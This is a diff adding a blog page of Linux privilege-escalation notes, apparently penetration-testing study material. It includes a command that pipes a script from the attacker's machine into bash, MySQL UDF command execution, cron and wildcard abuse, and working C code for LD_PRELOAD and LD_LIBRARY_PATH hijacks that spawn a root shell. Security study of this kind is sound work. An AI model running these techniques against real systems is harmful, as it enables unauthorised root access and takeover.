@@ -1,0 +1,343 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Linux PrivEsc</title>
+    <a href="https://pusher91.github.io/Blog/">Return to Main Page</a>
+</head>
+
+<hr>
+
+<body>
+
+    <h1>Linux PrivEsc</h1>
+
+    <h2>PrivEsc Strategy</h2>
+
+    <li>Kernel Exploits</li>
+    <ul>
+        <li>searchsploit &lt;kernel version&gt;</li>
+        <li>If you think an exploit should work but it is not, then look up the CVE for the exploit and google it to search for others.</li>
+    </ul>
+
+    <li>Check user id and groups</li>
+    <ul>
+        <li>id</li>
+        <li>Google exploits for groups</li>
+    </ul>
+
+    <li>Password attacks</li>
+    <ul>
+        <li>Password reuse</li>
+        <li>Guess passwords</li>
+        <li>Try to authenticate as other users:</li>
+        <ul>
+            <li>SSH</li>
+            <li>su &lt;user&gt;</li>
+        </ul>
+    </ul>
+
+    <li>Run linpeas</li>
+    <ul>
+        <li>Rerun as new user if a new on is accessed</li>
+        <li>If there is trouble downloading and running the script try piping to bash: curl &lt;url to kali machine/linpeas.sh&gt; | bash</li>
+        <ul>
+            <li>This method also avoids using the victim's disk</li>
+        </ul>
+    </ul>
+    <li>Look for sensitive files/information</li>
+    <ul>
+        <li>Locations that may contain passwords</li>
+        <ul>
+            <li>Recursively search directories for files that contain the word password</li>
+            <li>Home directory</li>
+            <li>History files</li>
+            <li>Config files</li>
+            <ul>
+                <li>Web server files</li>
+            </ul>
+            <li>Log files</li>
+            <ul>
+                <li>/var/log</li>
+            </ul>
+        </ul>
+        <li>Look for private SSH keys</li>
+    </ul>
+
+    <li>Look for running programs</li>
+    <ul>
+        <li>ps aux</li>
+        <li>Look for programs being running as root, see if exploitable</li>
+        <li>Enumerate versions, look for vulnerable/exploitable ones</li>
+        <ul>
+            <li>If there is trouble enumerating versions, try googling the md5sum of the program</li>
+        </ul>
+    </ul>
+
+    <li>mysql</li>
+    <ul>
+        <li>If we can log in to it, look for sensitive information</li>
+        <li>Attempt run commands as the user that is logged into mysql</li>
+        <ul>
+            <li>i.e. If we have access to mysql and it is running under the context of root</li>
+            <li>raptor_udf</li>
+            <li>/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so</li>
+            <li>/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so</li>
+            <ul>
+                <li>select sys_exec('&lt;command&gt;');</li>
+            </ul>
+        </ul>
+    </ul>
+
+    <li>If web page is running under the context of higher privilege user, try to create a web shell</li>
+
+    <li>Check network services (netstat -tulpn)</li>
+    <ul>
+        <li>Look for open ports/running services that didn't show during port scan</li>
+        <li>Forward internally listening ports to attacking machine</li>
+    </ul>
+
+    <li>Check for interesting programs</li>
+    <ul>
+        <li>PATH locations</li>
+        <li>dpkg -l</li>
+        <li>/var</li>
+        <li>/opt</li>
+        <li>/usr/local/src</li>
+        <li>/usr/src</li>
+        <li>Check programs for extended capabilities</li>
+        <ul>
+            <li>getcap &lt;file&gt;</li>
+            <ul>
+                <li>=en means root permissions.  As good as sudo</li>
+            </ul>
+        </ul>
+    </ul>
+
+    <li>Look for unmounted file systems</li>
+    <li>SUID/GUID files</li>
+    <ul>
+        <li>Check GTFOBins</li>
+        <li>Analyze file to see if commands it is calling is using absolute paths</li>
+        <ul>
+            <li>strace</li>
+        </ul>
+    </ul>
+
+    <li>File permissions</li>
+
+    <li>Sudo</li>
+    <ul>
+        <li>Check sudo permissions</li>
+        <ul>
+            <li>sudo -l</li>
+            <li>Check sudo commands against GTFOBins</li>
+            <li>If sudo command shows (<another user>) in front of the command this means we are able to execute the command as another user</li>
+                <ul>
+                    <li>Execute sudo command as another user: sudo -u &lt;username&gt; &lt;sudo command&gt;</li>
+                </ul>
+        </ul>
+        <li>Environment Variables</li>
+        <ul>
+            <li>Check with sudo -l</li>
+            <li>env_keep+=LD_PRELOAD - If this is set we can choose a shared object that is loaded before any others while running sudo</li>
+            <li>env_keep+=LD_LIBRARY_PATH - If this is set we can set where shared objects are searched for first.</li>
+        </ul>
+    </ul>
+
+    <li>Cron Jobs</li>
+    <ul>
+        <li>Check cron PATH, see if we have write access to any directories.</li>
+        <li>Check if we can write to file that crontab is running</li>
+        <ul>
+            <li>If so, change file to execute malicious command</li>
+        </ul>
+        <ul>
+            <li>Check if absolute paths are *not* being used</li>
+            <ul>
+                <li>If so, try to create a malicious executable in PATH preceding PATH directory of the executable that is currently being used</li>
+            </ul>
+        </ul>
+        <li>Check commands using wildcards *</li>
+        <ul>
+            <li>If so, create a file in the directory that the wildcard is being ran on.  Name this file as the malicious command line options you would like to use against this program.  Check GTFOBins to determine which flags to use.</li>
+        </ul>
+    </ul>
+
+    <li>systemd timers</li>
+    <ul>
+        <li>New way to do cronjob on services</li>
+        <li>systemctl list-timers</li>
+    </ul>
+
+    <h2>Shell upgrade & Enumeration</h2>
+
+    <li>Upgrade</li>
+    <table>
+        <tr>
+            <td>Enable tab and autocompletion</td>
+            <td>
+                <li>Send victim shell to background with ctrl+z</li>
+                <li>Command: stty raw -echo;fg;</li>
+                <li>Bring process back with fg</li>
+            </td>
+        </tr>
+        <tr>
+            <td>Format shell size if formatting is bad</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Check rows # and columns # on kali box, in a pane the same size as the victim shell.</td>
+                        <td>stty -a</td>
+                    </tr>
+                    <tr>
+                        <td>Victim shell</td>
+                        <td>stty rows &lt;#&gt; cols &lt;#&gt;</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>TTY Upgrade</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Check for TTY</td>
+                        <td>
+                            <li>tty</li>
+                            <li>sudo -i</li>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>Python</td>
+                        <td>python -c "import pty;pty.spawn('/bin/bash');"</td>
+                    </tr>
+                    <tr>
+                        <td>Python3</td>
+                        <td>python3 -c "import pty;pty.spawn('/bin/bash');"</td>
+                    </tr>
+                    <tr>
+                        <td>Perl</td>
+                        <td>perl -e 'exec "/bin/sh";'</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Enable "clear" command</td>
+            <td>export TERM=xterm</td>
+        </tr>
+        <tr>
+            <td>Setting PATH variable</td>
+            <td>export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:</td>
+        </tr>
+        <tr>
+            <td>Break out of rbash</td>
+            <td>
+                <table>
+                    <tr>
+                        <td>Method 1</td>
+                        <td>ssh &lt;username&gt;@&lt;ip address&gt; -t "bash --noprofile"</td>
+                    </tr>
+                    <tr>
+                        <td>Method 2</td>
+                        <td>ed<br>!'/bin/bash'</td>
+                    </tr>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>import os<br>os.system("bash");</td>
+        </tr>
+    </table>
+
+    <h2>Auto Enumeration Tools</h2>
+
+    <li>Kernel exploits</li>
+    <ul>
+        <li>Kernel exploits tool</li>
+        <ul>
+            <li>Linux Exploit Suggester Script</li>
+        </ul>
+    </ul>
+
+    <li>PrivEsc Tool</li>
+    <ul>
+        <li>linpeas</li>
+        <li>http://pentestmonkey.net/tools/audit/unix-privesc-check</li>
+        <li>http://labs.portcullis.co.uk/application/enum4linux/</li>
+        <li>Linux smart enumeration</li>
+        <li>LinEnum</li>
+        <li>https://github.com/AlessandroZ/BeRoot</li>
+        <li>https://github.com/linted/linuxprivchecker</li>
+        <li>suid3num</li>
+    </ul>
+
+    <h2>Sudo Environment Variables</h2>
+
+    <li>Environment Variables</li>
+    <ul>
+        <li>sudo -l to view configured environment options</li>
+        <li>LD_PRELOAD</li>
+        <ul>
+            <li>If LD_PRELOAD is set it will load whatever shared object is set before anything else.</li>
+            <ul>
+                <li>Create malicious shared object</li>
+                <pre>
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+void _init() {
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    setresuid(0,0,0);
+    system(&quot;/bin/bash -p&quot;);
+}
+
+#gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+                </pre>
+            </ul>
+            <li>Run any sudo enabled command:</li>
+            <ul>
+                <li>sudo LD_PRELOAD=/tmp/preload.so &lt;sudo command&gt;</li>
+            </ul>
+        </ul>
+    </ul>
+
+    <li>LD_LIBRARY_PATH</li>
+    <ul>
+        <li>LD_LIBRARY_PATH is an environment variable that contains the directories where shared libraries are searched for first.</li>
+        <ul>
+            <li>ldd command will show the shared objects used by a program</li>
+        </ul>
+        <li>Create a new shared object with the same name as the one used by the program</li>
+        <ul>
+            <li>Set the LD_LIBRARY_PATH to its directory to get the program to execute the new shared object instead.</li>
+            <li>Example:</li>
+            <ul>
+                <li>ldd /usr/bin/apache2</li>
+                <li>Output: shared objects, choose one to replace</li>
+                <li>Create a file to compile that will replace the original shared object </li>
+                <pre>
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+static void hijack() __attribute__((constructor));
+    void hijack() {unsetenv(&quot;LD_LIBRARY_PATH&quot;);
+    setresuid(0,0,0);
+    system(&quot;/bin/bash -p&quot;);
+}
+
+#gcc -o &lt;Malicious .so&gt; -shared -fPIC library_path.c  
+                </pre>
+                <li>run command</li>
+                <ul>
+                    <li>sudo LD_LIBRARY_PATH=&lt;Malicious .so directory&gt; &lt;sudo command&gt;</li>
+                    <li>Rooted</li>
+                </ul>
+            </ul>
+        </ul>
+    </ul>
+
+
+</body>
+</html>
